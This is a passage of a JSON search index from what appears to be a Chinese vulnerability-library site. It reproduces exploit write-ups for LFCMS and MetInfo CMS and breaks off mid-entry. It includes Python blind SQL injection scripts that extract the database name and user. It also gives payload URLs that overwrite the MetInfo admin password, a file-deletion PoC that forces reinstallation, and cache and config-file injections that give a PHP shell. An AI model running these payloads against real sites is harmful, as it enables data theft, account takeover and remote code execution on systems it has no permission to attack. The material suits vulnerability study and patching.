\u53ef\u4ee5\u770b\u5230\u5728\u7b2c\u516b\u884c\u8fdb\u800c\u8c03\u7528\u4e86tp\u7684find\u65b9\u6cd5\uff0c\u5728\u8be5\u7248\u672c\u4e2dfind\u65b9\u6cd5\u662f\u53ef\u4ee5\u8fdb\u884c\u6ce8\u5165\u7684\uff0c\u540c\u65f6\u53c2\u6570$id\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u9996\u5148\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u6b63\u5e38\u7684\u8f93\u5165\u60c5\u51b5(\u56fe\u4e2d\u57df\u540d\u4e3a\u672c\u5730\u642d\u5efa\u89e3\u6790) </p> <p>\u6839\u636etp3.2\u7684\u6ce8\u5165\u70b9\u6784\u9020\u4e00\u4e0b\u8bed\u53e5\uff0c\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5</p> <pre><code>http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and 1--\n</code></pre> <p>\u9875\u9762\u4e0e\u6b63\u5e38\u8bbf\u95ee\u76f8\u6bd4\u6ca1\u6709\u53d8\u5316\uff0c\u67e5\u770b\u4e00\u4e0b\u6570\u636e\u5e93\u65e5\u5fd7\uff0c\u770b\u4e0b\u540e\u7aef\u6570\u636e\u5e93\u8bed\u53e5 </p> <p>\u53ef\u4ee5\u770b\u5230\u5728id\u5904\u5df2\u7ecf\u53ef\u4ee5\u8fdb\u884csql\u8bed\u53e5\u7684\u62fc\u63a5\uff0c\u4e5f\u5c31\u8bc1\u660e\u8be5\u5904\u662f\u5b58\u5728\u53ef\u5229\u7528\u7684\u6ce8\u5165\u70b9\u7684\uff0c\u7531\u4e8e\u672c\u5957\u7a0b\u5e8f\u5bf9\u4e8e\u9519\u8bef\u4fe1\u606f\u662f\u6709\u5c4f\u853d\u7684\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u5f88\u96be\u5229\u7528\u62a5\u9519\u6ce8\u5165\u5e26\u51fa\u6570\u636e\uff0c\u5728\u8be5\u5904\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u5e03\u5c14\u7c7b\u578b\u7684\u76f2\u6ce8\uff0c\u4e24\u79cd\u56de\u663e\u72b6\u6001\u5982\u4e0b   \u63a5\u7740\u5199\u4e00\u4e0b\u811a\u672c\uff08\u4ee5\u67e5\u8be2\u6570\u636e\u5e93\u540d\u4e3a\u4f8b\uff09</p> <pre><code>import requests\nurl = 'http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and '\nresult = ''\nfor i in range(1,50):\nprint('-----------------------------')\nfor j in range(32,127):\npayload = 'if((ascii(substr((select database()),{},1))={}),1,0)--'.format(i,j)\ntemp = url+payload\ntry:\nhtml = requests.get(temp,timeout=10)\nif 'tttest' in html.text:\nresult+=chr(j)\nprint(result)\nbreak\nexcept:\nprint('[-]error')\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b  \u76f8\u540c\u539f\u7406\u7684\u5229\u7528\u70b9\u8fd8\u6709\u5f88\u591a\uff0c\u5982\u4f4d\u4e8e/Application/Home/Controller/MovieController.class.php\u4e2d\u7684index\u65b9\u6cd5\u7684id\u53c2\u6570\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u91cd\u590d\u5206\u6790\u4e86</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/#_4","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7844</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/","title":"LFCMS\u524d\u53f0sql\u6ce8\u5165\uff08\u4e8c\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/#_1","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/#_2","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/#_3","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u6f0f\u6d1e\u8d77\u59cb\u70b9\u4f4d\u4e8e/Application/Home/Controller/AjaxController.class.php\u6587\u4ef6\u4e2d\u7684randMovie\u65b9\u6cd5\uff0c\u4ee3\u7801\u5982\u4e0b  \u7b2c\u4e03\u884c\u4ee3\u7801\u4e2d\u8c03\u7528\u4e86Ajax\u6a21\u578b\u4e2d\u7684randMovie\u65b9\u6cd5\uff0c\u540c\u65f6limit\u548ccategory\u662f\u6211\u4eec\u8f93\u5165\u7684\u53ef\u63a7\u7684\u53c2\u6570\uff0c\u8ddf\u8fdbrandMovie\u65b9\u6cd5</p> <pre><code>public function randMovie($limit=6,$category='') {\nif($category) {\n$type='and category='.$category;\n}\n$prefix=C('DB_PREFIX');\n$mlist=M()-&gt;query('SELECT * FROM `'.$prefix.'movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `'.$prefix.'movie`)-(SELECT MIN(id) FROM `'.$prefix.'movie`))+(SELECT MIN(id) FROM `'.$prefix.'movie`)) AS idx) AS t2 WHERE t1.id &gt;= t2.idx '.$type.' ORDER BY t1.id LIMIT '.$limit);\nforeach($mlist as $key=&gt;$value) {\n$list[$key]=D('Tag')-&gt;movieChange($value,'movie');\n}\nreturn $list;\n}\n</code></pre> <p>\u5728\u8fd9\u91cc\u6ce8\u610f\u5230\\(type\u4e0e\\)limit\u5728sql\u8bed\u53e5\u6267\u884c\u65f6\u5747\u6ca1\u6709\u88ab\u5355\u5f15\u53f7\u5305\u88f9\uff0c\u76f4\u63a5\u62fc\u63a5\u5230\u8bed\u53e5\u5f53\u4e2d\uff0c\u8fd9\u91cc\u5c31\u5b58\u5728\u4e86sql\u6ce8\u5165\u7684\u53ef\u80fd\uff0c\u9996\u5148\u6211\u4eec\u5728movie\u8868\u91cc\u653e\u4e00\u6761\u6570\u636e\uff0c\u770b\u4e00\u4e0b\u6b63\u5e38\u6267\u884c\u65f6sql\u8bed\u53e5\u662f\u5982\u4f55\u6267\u884c\u7684  \u67e5\u770b\u6570\u636e\u5e93\u65e5\u5fd7\u53ef\u4ee5\u5f97\u5230\u5982\u4e0bsql\u8bed\u53e5</p> <pre><code>SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id &gt;= t2.idx and category=2 ORDER BY t1.id LIMIT 1\n</code></pre> <p>\u63a5\u7740\u6765\u5c1d\u8bd5\u4e0b\u8fdb\u884c\u6ce8\u5165\uff0c\u6d4b\u8bd5\u94fe\u63a5\u5982\u4e0b</p> <pre><code>http://lfcms.com/index.php/Ajax/randMovie?limit=1&amp;category=2 and sleep(5)\n</code></pre> <p>\u9875\u9762\u786e\u5b9e\u5ef6\u8fdf\u4e865\u79d2\uff0c\u90a3\u4e48\u63a5\u7740\u770b\u4e00\u4e0b\u540e\u7aef\u6570\u636e\u5e93\u7684\u8bed\u53e5</p> <pre><code>SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id &gt;= t2.idx and category=2 and sleep(5) ORDER BY t1.id LIMIT 1\n</code></pre> <p>\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u8be5\u5904\u5b58\u5728\u7740\u53ef\u7528\u7684\u6ce8\u5165\u70b9\uff0c\u63a5\u4e0b\u6765\u7f16\u5199\u811a\u672c\u8dd1\u4e00\u4e0b\u6570\u636e\u5e93\u7528\u6237\u540d\u8bd5\u8bd5</p> <pre><code>import requests\nurl = 'http://lfcms.com/index.php/Ajax/randMovie?limit=1&amp;category=2 and '\ns = requests.session()\nresult = \"\"\nfor i in range(1,50):\nprint('==========================')\nfor j in range(32,127):\npayload = \"if((ascii(substr((select user()),{},1))={}),sleep(5),0)\".format(i,j)\ntemp = url+payload\ntry:\ns.get(temp,timeout=5)\nexcept:\nresult+= chr(j)\nprint(result)\nbreak\n</code></pre> <p></p> <p>\u76f8\u540c\u539f\u7406\u7684\u5229\u7528\u70b9\u540c\u6837\u4e0d\u6b62\u4e00\u4e2a\uff0c\u5982/Application/Home/Controller/PlayerController.class.php\u6587\u4ef6\u4e2d\u7684down\u65b9\u6cd5\u8c03\u7528\u4e86\u6a21\u578bmovie\u4e2d\u7684getPlayerUrl\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7684pid\u53c2\u6570\u540c\u6837\u53ef\u4ee5\u6ce8\u5165</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/#_4","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7844</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/","title":"LFCMS\u540e\u53f0getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/#_1","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/#_2","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/#_3","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u8be5\u6f0f\u6d1e\u53ef\u4ee5\u5229\u7528\u7684\u539f\u56e0\u4e00\u662f\u5728\u4e8e\u540e\u53f0\u5bf9\u4e8e\u7ad9\u70b9\u914d\u7f6e\u6570\u636e\u6ca1\u6709\u505a\u597d\u8fc7\u6ee4\uff0c\u4e8c\u662f\u5229\u7528\u4e86tp3.2\u7248\u672c\u4e0b\u672c\u8eab\u5b58\u5728\u7684\u7f13\u5b58\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u8d77\u59cb\u5229\u7528\u70b9\u4f4d\u4e8e/Application/Admin/Controller/ConfigController.class.php\u4e2d\u7684save\u65b9\u6cd5\uff0c\u4ee3\u7801\u5982\u4e0b </p> <p>\u8be5\u5904\u5c06\u540e\u53f0\u8bbe\u7f6e\u7684\u914d\u7f6e\u9879\u76f4\u63a5\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u63a5\u7740\u5f53\u7528\u6237\u8bbf\u95ee\u7ad9\u70b9\u524d\u53f0\u9875\u9762\u65f6\uff0c\u4f1a\u8c03\u7528/Application/Home/Controller/HomeController.class.php\u4e2d\u7684_initialize\u65b9\u6cd5\uff0c\u90e8\u5206\u4ee3\u7801\u5982\u56fe  \u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u65f6\uff0c\u4f1a\u8c03\u7528\u7b2c\u4e8c\u5341\u4e00\u884c\u7684\u7f13\u5b58\u51fd\u6570\u5199\u7f13\u5b58\u6587\u4ef6\uff0c\u5728\u8fd9\u91cc\u5982\u679c\u5728\u8bbe\u7f6e\u914d\u7f6e\u6570\u636e\u7684\u65f6\u5019\u5199\u5165\u6076\u610f\u7684PHP\u4ee3\u7801\uff0c\u5c31\u53ef\u4ee5\u5728\u7f13\u5b58\u6587\u4ef6\u4e2d\u5199\u5165\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8fdb\u800cgetshell\uff0c\u9996\u5148\u6211\u4eec\u6765\u5230\u540e\u53f0\u7528\u6237\u914d\u7f6e\u8bbe\u7f6e\u5904  \u63d0\u4ea4\u6570\u636e\u6293\u53d6\u6570\u636e\u5305\uff0c\u5728\u5176\u4e2d\u4e00\u4e2a\u8bbe\u7f6e\u9879\u4e2d\u586b\u5165php\u4ee3\u7801\uff0c\u7531\u4e8e\u7f13\u5b58\u6587\u4ef6\u5bf9\u4e8e\u914d\u7f6e\u9879\u8fdb\u884c\u4e86\u6ce8\u91ca\uff0c\u4e3a\u4e86\u9003\u9038\u6ce8\u91ca\u6211\u4eec\u9700\u8981\u53e6\u8d77\u4e00\u884c\u5199\u5165PHP\u4ee3\u7801\u5e76\u5c06\u540e\u9762\u7684\u65e0\u7528\u6570\u636e\u6ce8\u91ca\u6389\uff0c\u5982\u56fe  \u7136\u540e\u8bbf\u95ee\u524d\u53f0\u9875\u9762\u751f\u6210\u7f13\u5b58\u6587\u4ef6\uff0c\u7f13\u5b58\u6587\u4ef6\u5728/Application/Runtime/Temp/\u76ee\u5f55\u4e0b\uff0c\u6587\u4ef6\u540d\u4e3a\u7f13\u5b58\u6570\u636e\u540d\u79f0\u7684MD5\u503c\uff0c\u5728\u8fd9\u91cc\u4e5f\u5c31\u662fDB_CONFIG_DATA\u7684MD5\u503c\uff0c\u6211\u4eec\u76f4\u63a5\u8bbf\u95ee\u7f13\u5b58\u6587\u4ef6</p> <pre><code>http://lfcms.com/Application/Runtime/Temp/95a1fe934b68ebfee8468bf0bc4f0000.php\n</code></pre> <p> \u6210\u529f\u7684\u5199\u5165\u4e86PHP\u4ee3\u7801</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/#_4","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7844#toc-4</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfo%20V5.1.7%20getshell/","title":"metinfo\u591a\u4e2a\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfo%20V5.1.7%20getshell/#affected-version","title":"Affected Version","text":"<p>\u7248\u672c\uff1aMetInfo V5.1.7  2013\u5e745\u670823 </p> <p>metinfo\u591a\u4e2a\u6f0f\u6d1e(\u53efgetshell)  </p> <p>\u5ba1\u8ba1\u4e00\u822c\u5148\u770b\u6838\u5fc3\u6587\u4ef6\u3002</p> <p><code>\\include\\common.inc.php</code> \u4e2d\u768421-28\u884c</p> <pre><code>define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());\nisset($_REQUEST['GLOBALS']) &amp;&amp; exit('Access Error');\nrequire_once ROOTPATH.'include/global.func.php';\nforeach(array('_COOKIE', '_POST', '_GET') as $_request) {\n    foreach($$_request as $_key =&gt; $_value) {\n        $_key{0} != '_' &amp;&amp; $$_key = daddslashes($_value);\n    }\n}\n</code></pre> <p>\u5927\u6982\u4ece21\u884c\u7a0b\u5e8f\u5f00\u59cb\u4f7f\u7528\u4e86\u4f2a<code>register_globals</code>\u673a\u5236\u3002</p> <p>2\uff1a \u53d8\u91cf\u672a\u521d\u59cb\u5316\u53caextract\u51fd\u6570\u4f7f\u7528\u4e0d\u5f53\u3002</p> <p>\u5728<code>common.inc.php</code>\u6587\u4ef6\u968f\u540e\u7684\u4ee3\u7801\u91cc\u5305\u542b\u4e86\u4e00\u4e2a<code>config.inc.php</code>\u7684\u6587\u4ef6, \u770b\u540d\u5b57\u5c31\u77e5\u9053\u662f\u4e00\u4e9b\u521d\u59cb\u5316\u53d8\u91cf\u914d\u7f6e, \u7a0b\u5e8f\u5458\u5c06\u5e94\u7528\u7a0b\u5e8f\u6240\u9700\u53d8\u91cf</p> <p>\u653e\u5728\u4e86<code>register_globals</code>\u673a\u5236\u4e4b\u540e\u58f0\u660e\u4f30\u8ba1\u5c31\u662f\u6015\u53d8\u91cf\u88ab\u8986\u76d6.\u4f46\u662f<code>config.inc.php</code>\u7684\u4e00\u4e2a\u6570\u7ec4<code>$settings</code>\u5374\u5fd8\u8bb0\u4e86\u521d\u59cb\u5316.</p> <pre><code>/*\u8bfb\u914d\u7f6e\u6570\u636e*/\n$query = \"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'\";\n$result = $db-&gt;query($query);\nwhile($list_config= $db-&gt;fetch_array($result)){\n    if($metinfoadminok)$list_config['value']=str_replace('\"', '&amp;#34;', str_replace(\"'\", '&amp;#39;',$list_config['value']));\n    $settings_arr[]=$list_config;\n    if($list_config['columnid']){\n        $settings[$list_config['name'].'_'.$list_config['columnid']]=$list_config['value'];\n    }else{\n        $settings[$list_config['name']]=$list_config['value'];\n    }\n    if($list_config['flashid']){\n        $list_config['value']=explode('|',$list_config['value']);\n        $falshval['type']=$list_config['value'][0];\n        $falshval['x']=$list_config['value'][1];\n        $falshval['y']=$list_config['value'][2];\n        $falshval['imgtype']=$list_config['value'][3];\n        $met_flasharray[$list_config['flashid']]=$falshval;\n    }\n}\n@extract($settings);\n</code></pre> <p>\u5728\u6ca1\u6709\u521d\u59cb\u5316\u7684\u60c5\u51b5\u4e0b\u53c8\u4f7f\u7528\u4e86extract($settings),\u7ed3\u5408\u524d\u9762\u7684register_globals\u673a\u5236\u8fd9\u6837\u5c31\u5bfc\u81f4\u591a\u4e2a\u53d8\u91cf\u53ef\u4ee5\u88ab\u8986\u76d6\u6389\u4ece\u800c\u63a7\u5236\u6574\u4e2a\u7a0b\u5e8f\u903b\u8f91.</p> <p>3:sql\u6ce8\u5165\u7ed5\u8fc7</p> <pre><code>\u524d\u9762\u7684\u9632\u6ce8\u5165\u51fd\u6570\u91cc\u53ef\u4ee5\u770b\u5230\u66ff\u6362\u4e86\u4e00\u4e9b\u5e38\u7528\u7684\u5173\u952e\u5b57\uff0c\u4f7f\u6ce8\u5165\u7684\u96be\u5ea6\u589e\u52a0\u4e86\uff0c\u4f46\u90a3\u4ec5\u4ec5\u53ea\u5bf9sql\u8bed\u53e5\u7684where\u4e4b\u540e\u6ce8\u5165\u6709\u6240\u9632\u8303\u3002\n\n\u5bf9\u4e8e\u53ef\u4ee5\u8986\u76d6\u7cfb\u7edf\u53d8\u91cf\u7684\u548b\u4eec\u6765\u8bb2\u5c31\u4e0d\u592a\u7ba1\u7528\u4e86\u800c\u4e14\u65e0\u89c6GPC\uff0csql\u6ce8\u91ca\u7b26\u4e5f\u6ca1\u6709\u8fc7\u6ee4\u3002\n\n\u4e3a\u4e86\u964d\u4f4e\u653b\u51fb\u6210\u672c\u6211\u6311\u4e86\u4e00\u5904\u6700\u5bb9\u6613\u5b9e\u73b0\u653b\u51fb\u5730\u65b9\uff0c\u4e00\u4e2aupdate\u7684sql\u8bed\u53e5\u3002\n\n\u5728 include\\hits.php\u768425\u884c\u5de6\u53f3\u3002\n\n$query = \"update $met_hits SET hits='$hits_list[hits]' where id='$id'\";\n\n\u8986\u76d6\u6389$met_hits\u53d8\u91cf\u5c31\u53ef\u4ee5update\u4efb\u4f55\u6570\u636e\u8868\uff0c\u5982\u4fee\u6539\u7ba1\u7406\u5458\u5bc6\u7801\u3002\n\nhits.php?type=img&amp;settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23\n\n\u4f7f\u7528\u5bc6\u78011\u767b\u9646\u540e\u53f0\u62ffshell\uff0c\u518d\u628a\u7ba1\u7406\u5458\u5bc6\u7801\u6539\u56de\u6765\u3002\n\nhits.php?type=img&amp;settings[met_img]=met_admin_table+SET+admin_pass=admin_introduction+WHERE+id=1%23\n</code></pre> <p>\u4fee\u6539\u5bc6\u7801</p> <pre><code>http://192.168.86.194:9000/MetInfo517/include/hits.php?type=img&amp;settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23\n</code></pre> <p>\u5c06\u5bc6\u7801\u4fee\u6539\u4e3a 1</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfo%20V5.1.7%20getshell/#references","title":"References","text":"<p>metinfo\u591a\u4e2a\u6f0f\u6d1e(\u53efgetshell) --wooyun-2013-043795 </p> <p>What is register_globals and why is it a security risk?</p> <p>register_globals</p> <p>PHP Backdoors: Hidden With Clever Use of Extract Function</p> <p>PHP extract() Vulnerability</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/","title":"MetInfoCMS 5.X\u7248\u672cGETSHELL\u6f0f\u6d1e\u5408\u96c6","text":"<p>MetInfoCMS 5.X\u7248\u672cGETSHELL\u6f0f\u6d1e\u5408\u96c6  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x00","title":"0x00 \u524d\u8a00","text":"<p>2018\u5e741\u6708\u5e95MetInfoCMS\u5b98\u65b9\u9686\u91cd\u53d1\u5e036.0\u7248\u672c\uff0c\u8c03\u6574\u4e86\u4e4b\u524d\u201c\u6f0f\u6d1e\u767e\u51fa\u201d\u7684\u6846\u67b6\u7ed3\u6784\uff0c\u4fee\uff08\u675c\uff09\u590d\uff08\u7edd\uff09\u4e86\u591a\u4e2a5.X\u7684\u7248\u672c\u540e\u53f0Gestshell\u6f0f\u6d1e\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x01getshell","title":"0x01\u5b89\u88c5\u8fc7\u7a0b\u8fc7\u6ee4\u4e0d\u4e25\u5bfc\u81f4Getshell","text":"<p>\u524d\u63d0:\u6709\u5220\u9664/config/install.lock\u6743\u9650</p> <p>\u9ed8\u8ba4\u5b89\u88c5\u7684\u65f6\u5019\u8bbe\u7f6e\u4e86\u6743\u9650\u7684@chmod('../config/install.lock',0554);\uff0c\u6240\u4ee5\u9700\u8981\u5728\u6743\u9650\u4fee\u6539\u4e86\u7684\u60c5\u51b5\u4e0b\u624d\u80fd\u5229\u7528\u8fd9\u4e2a</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#1","title":"1. \u7ed3\u5408\u7f51\u4e0a\u7206\u51fa\u7684\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e","text":"<pre><code>#/admin/app/batch/csvup.php\n\n$classflie=explode('_',$fileField);\n$classflie=explode('-',$classflie[count($classflie)-1]);\n$class1=$classflie[0];\n$class2=$classflie[1];\n$class3=$classflie[2];\n$class=$class3?$class3:($class2?$class2:$class1); \n$classcsv=$db-&gt;get_one(\"select * from $met_column where id=$class\");\nif(!$classcsv){\nmetsave(\"../app/batch/contentup.php?anyid=$anyid&amp;lang=$lang\",$lang_csvnocolumn,$depth);\n}\n\n# \u7701\u7565\u4ee3\u7801\n\n@file_unlink($flienamecsv);\n</code></pre> <p>\u5220\u9664/config/install.lock\u6587\u4ef6\u53ef\u4ee5\u5bfc\u81f4\u91cd\u88c5\uff08\u9700\u8981\u7531\u5bf9\u5e94\u7684\u5220\u9664\u6743\u9650\uff09\uff0c\u5220\u9664\u6587\u4ef6\u7684poc\u5982\u4e0b\uff1a</p> <pre><code>http://xxx.com/admin/app/batch/csvup.php?fileField=1_1231-1&amp;flienamecsv=../../../config/install.lock\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#2","title":"2. \u91cd\u88c5\u65f6\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u8fc7\u6ee4\u4e0d\u5f53","text":"<pre><code>#/install/index.php\n    case 'db_setup':\n    {\n        if($setup==1){\n            $db_prefix      = trim($db_prefix);\n            $db_host        = trim($db_host);\n            $db_username    = trim($db_username);\n            $db_pass        = trim($db_pass);\n            $db_name        = trim($db_name);\n            $config=\"&lt;?php\n                   /*\n                   con_db_host = \\\"$db_host\\\"\n                   con_db_id   = \\\"$db_username\\\"\n                   con_db_pass    = \\\"$db_pass\\\"\n                   con_db_name = \\\"$db_name\\\"\n                   tablepre    =  \\\"$db_prefix\\\"\n                   db_charset  =  \\\"utf8\\\";\n                  */\n                  ?&gt;\";\n\n            $fp=fopen(\"../config/config_db.php\",'w+');\n            fputs($fp,$config);\n            fclose($fp);\n</code></pre> <p>\u5728\u6570\u636e\u5e93\u914d\u7f6e\u65f6\\(db_host,\\)db_username,\\(db_pass,\\)db_name,$db_prefix\u53c2\u6570\u53ef\u63a7\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#3-poc","title":"3. POC","text":"<p>\u6570\u636e\u5e93\u914d\u7f6e\u65f6\u4fee\u6539\u4efb\u610f\u53c2\u6570\u4e3a<code>*/phpinfo();/*</code>\u53ef\u5bfc\u81f4Getshell\u3002\u70b9\u51fb\u4fdd\u5b58\u4e4b\u540e\uff0c\u76f4\u63a5\u8bbf\u95ee/config/config_db.php\u5373\u53efgetshell\u3002 shell\u5730\u5740:<code>http://xxx.com/config/config_db.php</code></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#0x02-cve-2017-11347getshell","title":"0x02 CVE-2017-11347\u8865\u4e01\u7ed5\u8fc7\u7ee7\u7eedGetshell","text":"<p>\u524d\u63d0\uff1awindows\u670d\u52a1\u5668+\u7f51\u7ad9\u7edd\u5bf9\u8def\u5f84\uff08\u53ea\u9700\u8981\u77e5\u9053\u7f51\u7ad9index.php\u6240\u5728\u76ee\u5f55\u7684\u4e0a\u4e00\u7ea7\u76ee\u5f55\u540d\uff09</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#1_1","title":"1. \u67e5\u627e\u7edd\u5bf9\u8def\u5f84\u7684\u65b9\u6cd5\uff1a","text":"<ul> <li> <p>\u5229\u7528\u5b89\u88c5\u76ee\u5f55\u4e0b\u7684phpinfo\u6587\u4ef6\uff1a <code>/install/phpinfo.php</code></p> </li> <li> <p>\u5229\u7528\u62a5\u9519\u4fe1\u606f(</p> </li> </ul> <p>\u4fe1\u606f\u5728HTML\u6ce8\u91ca\u4e2d\uff0c\u5fc5\u987b\u901a\u8fc7\u67e5\u770b\u7f51\u9875\u6e90\u7801\u7684\u65b9\u5f0f\u624d\u80fd\u83b7\u53d6\u5185\u5bb9\uff0c\u5426\u5219\u770b\u4e0a\u53bb\u662f\u7a7a\u767d\u9875</p> <p>)</p> <pre><code>/app/system/include/public/ui/admin/top.php\n/app/system/include/public/ui/admin/box.php\n/app/system/include/public/ui/web/sidebar.php\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/MetinfoCMS/MetInfoCMS%205.X%E7%89%88%E6%9C%ACGETSHELL%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/#2_1","title":"2. 